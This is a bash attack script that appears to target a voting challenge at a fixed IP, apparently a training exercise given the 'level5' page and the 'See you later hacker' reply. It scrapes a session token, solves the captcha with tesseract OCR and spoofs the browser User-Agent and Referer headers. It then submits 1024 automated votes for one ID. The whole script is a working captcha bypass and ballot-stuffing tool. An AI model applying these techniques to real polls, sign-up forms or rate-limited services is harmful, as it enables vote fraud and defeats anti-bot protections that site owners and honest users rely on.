#!/bin/bash

RED='\033[0;31m'
BLU='\033[0;34m'
GRE='\033[0;32m'
NC='\033[0m' # No Color
url_captcha="http://158.69.76.135/tim.php"
url="http://158.69.76.135/level5.php"
id=892

user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'
referer="Referer: http://158.69.76.135/level5.php"
count=1024

for (( c=1; c<=$count; c++ ))
do
echo -e "${RED}------Vote for ${id}------${NC}"

cookie=$(curl -c cookie.txt -I -s -H "$referer" -A "$user_agent" $url | grep -o 'HoldTheDoor=.*' | cut -d ';' -f1 | cut -d '=' -f2)

curl --cookie cookie.txt $url_captcha > image.png
sleep .5
convert image.png -write MPR:source -morphology close rectangle:3x2 image2.png
sleep .5
echo -e $GRE
tesseract image2.png out -psm 8 -c tessedit_char_whitelist=0123456789abcdef
echo -e $NC
sleep .5
captcha=$(cat out.txt | head -1)

echo -e "${RED} Captcha Resolve with Tesseract =  $captcha ${NC}"

response=$(curl -H "$referer" -A "$user_agent" --cookie cookie.txt -X POST $url -d "key=$cookie&captcha=$captcha&holdthedoor=&id=$id" | cut -d '!' -f1) #> /dev/null

if [[ $response == "See you later hacker" ]]; then
printf "fallo\n"
count=$count+1
fi

echo -e $RED $response $NC

echo -e "${BLU}Send Post ... ${NC}"
#sleep .2
done
